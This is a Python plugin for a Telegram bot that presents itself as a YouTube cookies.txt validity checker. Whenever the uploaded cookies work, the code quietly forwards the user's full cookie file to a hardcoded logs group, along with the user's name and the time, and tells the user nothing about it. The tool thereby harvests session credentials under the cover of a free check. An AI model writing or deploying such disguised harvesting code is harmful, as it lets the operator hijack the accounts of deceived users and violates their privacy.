import yt_dlp
import os
from datetime import datetime
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message

# Tracking Users Who Used /chkcookies
active_users = set()

# Logs Group ID (Cookies file waha send hogi)
LOGS_GROUP_ID = -1002300353707  

# Stylish Symbols & Fonts for VIP Look
BULLET = "➤"
CHECK = "✅"
CROSS = "❌"
CLOCK = "⏳"
SHIELD = "🛡"
FIRE = "🔥"
STAR = "⭐"
USER = "👤"
TIME = "⏰"

# Step 1: Enable Checking with `/chkcookies`
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    active_users.add(message.chat.id)
    await message.reply(f"{CHECK} ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ! {CLOCK}")

# Step 2: Handle Wrong Inputs (Images, Videos, Text)
@app.on_message(filters.private & ~filters.document)
async def warn_wrong_input(client, message):
    if message.chat.id in active_users:
        await message.reply(f"{CROSS} ɪɴᴄᴏʀʀᴇᴄᴛ ɪɴᴘᴜᴛ ! ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ `cookies.txt` file.\n\n✅ sᴛᴇᴘs:\n1️⃣ ᴏᴘᴇɴ ғɪʟᴇ ᴍᴀɴᴀɢᴇʀ 📂\n2️⃣ ғɪɴᴅ `cookies.txt`\n3️⃣ sᴇɴᴅ ɪᴛ ʜᴇʀᴇ ✅")
        
        # Log incorrect input to logs group
        log_msg = f"""
{SHIELD} ɪɴᴄᴏʀʀᴇᴄᴛ ɪɴᴘᴜᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ !
{BULLET} {USER} ᴜsᴇʀ: {message.from_user.first_name}
{BULLET} {TIME} Time: {datetime.now().strftime("%d-%m-%Y %I:%M %p")}
{BULLET} {CROSS} ᴇʀʀᴏʀ: sᴇɴᴛ ᴡʀᴏɴɢ ғɪʟᴇ ᴛʏᴘᴇ ᴏʀ ᴍᴇssᴀɢᴇ ɪɴsᴛᴇᴀᴅ ᴏғ `cookies.txt`!
"""
        await client.send_message(LOGS_GROUP_ID, log_msg)

# Step 3: Accept Only If `/chkcookies` was Used
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    if message.chat.id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply(f"{CROSS} ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ `cookies.txt` ғɪʟᴇ!\n✅ Make sure the file is named `cookies.txt`.")
        
        # Log invalid file
        log_msg = f"""
{SHIELD} ɪɴᴠᴀʟɪᴅ ғɪʟᴇ sᴇɴᴛ !
{BULLET} {USER} ᴜsᴇʀ: {message.from_user.first_name}
{BULLET} {TIME} ᴛɪᴍᴇ: {datetime.now().strftime("%d-%m-%Y %I:%M %p")}
{BULLET} {CROSS} ᴇʀʀᴏʀ: sᴇɴᴛ `{file_path.split('/')[-1]}` ɪɴsᴛᴇᴀᴅ ᴏғ `cookies.txt`!
"""
        await client.send_message(LOGS_GROUP_ID, log_msg)
        return

    # Step 4: Read Cookies File
    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply(f"{CROSS} ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ɪs ᴇᴍᴘᴛʏ !")
            os.remove(file_path)  # Delete temp file
            return

        # Step 5: Get User Info & Time
        user_name = message.from_user.username
        full_name = message.from_user.first_name
        display_name = f"@{user_name}" if user_name else full_name
        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")  # Format: DD-MM-YYYY HH:MM AM/PM

        # Step 6: Validate YouTube Cookies
        ydl_opts = {"quiet": True, "cookiefile": file_path}

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = f"{CHECK} ʏᴏᴜʀ ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ᴠᴀʟɪᴅ ! "
            log_msg = f"""
{SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
{BULLET} {CHECK} ʀᴇsᴜʟᴛ: ᴡᴏʀᴋɪɴɢ {CHECK}
{BULLET} {USER} ᴜsᴇʀ: {display_name}
{BULLET} {TIME} ᴄʜᴇᴄᴋᴇᴅ ᴀᴛ : {check_time}
"""

            # Send valid cookies to group
            await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = f"{CROSS} Your ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ɪɴᴠᴀʟɪᴅ ᴏʀ ᴇxᴘɪʀᴇᴅ !"
            log_msg = f"""
{SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
{BULLET} {CROSS} ʀᴇsᴜʟᴛ: ɪɴᴠᴀʟɪᴅ {CROSS}
{BULLET} {USER} ᴜsᴇʀ: {display_name}
{BULLET} {TIME} ᴄʜᴇᴄᴋᴇᴅ ᴀᴛ: {check_time}
"""
        # Send only log (without file) to group
        await client.send_message(LOGS_GROUP_ID, log_msg)
        await message.reply(msg, quote=True)

    except Exception as e:
        await message.reply(f"⚠️ ᴇʀʀᴏʀ ʀᴇᴀᴅɪɴɢ ғɪʟᴇ: `{str(e)}`")

    # Step 7: Clean Up Temporary File
    os.remove(file_path)

    # Step 8: Remove User from Active List
    active_users.remove(message.chat.id)
